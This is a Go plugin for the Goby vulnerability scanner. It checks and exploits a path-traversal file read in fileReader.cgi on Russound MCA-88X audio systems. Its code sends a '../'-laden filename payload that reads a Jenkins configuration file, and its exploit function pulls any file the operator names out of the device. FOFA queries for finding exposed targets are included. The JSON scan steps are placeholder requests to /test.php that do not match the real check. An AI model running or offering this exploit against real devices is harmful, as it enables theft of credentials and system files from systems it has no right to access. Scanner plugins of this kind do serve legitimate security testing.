package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Russound MCA-88X fileReader.cgi filename File Read Vulnerability",
    "Description": "<p>Russound MCA-88X is the audio management system built into the Russound range of products.</p><p>The filename parameter of the Russound MCA-88X fileReader.cgi file is not strictly verified, and attackers can exploit the vulnerability to read sensitive information such as system passwords.</p>",
    "Product": "Russound-MCA-88X",
    "Homepage": "https://www.russound.com/",
    "DisclosureDate": "2023-03-16",
    "Author": "h1ei1",
    "FofaQuery": "body=\"/utils/rv.directives.js\" || body=\"www.russound.com\"",
    "GobyQuery": "body=\"/utils/rv.directives.js\" || body=\"www.russound.com\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.russound.com/.\">https://www.russound.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../../opt/russound/conf/jenkins.conf.example",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Russound MCA-88X 音频管理系统 fileReader.cgi 文件 filename 参数任意文件读取漏洞",
            "Product": "Russound-MCA-88X",
            "Description": "<p>Russound MCA-88X 是 Russound 系列产品内置的音频管理系统。<br></p><p>Russound MCA-88X fileReader.cgi 文件的 filename 参数未经过严格校验，攻击者可利用漏洞读取系统密码等敏感信息。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.russound.com/\">https://www.russound.com/</a><br></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取服务器重要文件，如系统配置文件、数据库配置文件等等，导致网站处于极度不安全的状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Russound MCA-88X fileReader.cgi filename File Read Vulnerability",
            "Product": "Russound-MCA-88X",
            "Description": "<p>Russound MCA-88X is the audio management system built into the Russound range of products.</p><p>The filename parameter of the Russound MCA-88X fileReader.cgi file is not strictly verified, and attackers can exploit the vulnerability to read sensitive information such as system passwords.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.russound.com/.\">https://www.russound.com/</a><br></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-12",
    "PocId": "10859"
}`

	sendPayloadb391bcdd := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/fileReader.cgi")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/json")
		cfg.Data = `{"filename":"` + filePath + `"}`
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, _ := sendPayloadb391bcdd(u, "../../../../../opt/russound/conf/jenkins.conf.example")
			return rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, "jenkinsUser=")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := goutils.B2S(ss.Params["filePath"])
			rsp, err := sendPayloadb391bcdd(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			}
			if strings.Contains(rsp.Utf8Html, "\"retCode\":\"E\"") {
				expResult.Output = "目标文件或文件夹不存在"
			} else {
				expResult.Success = true
				expResult.Output = rsp.Utf8Html[strings.Index(rsp.Utf8Html, "\"retVal\":\"")+10 : strings.Index(rsp.Utf8Html, "\"}")]
			}
			return expResult
		},
	))
}
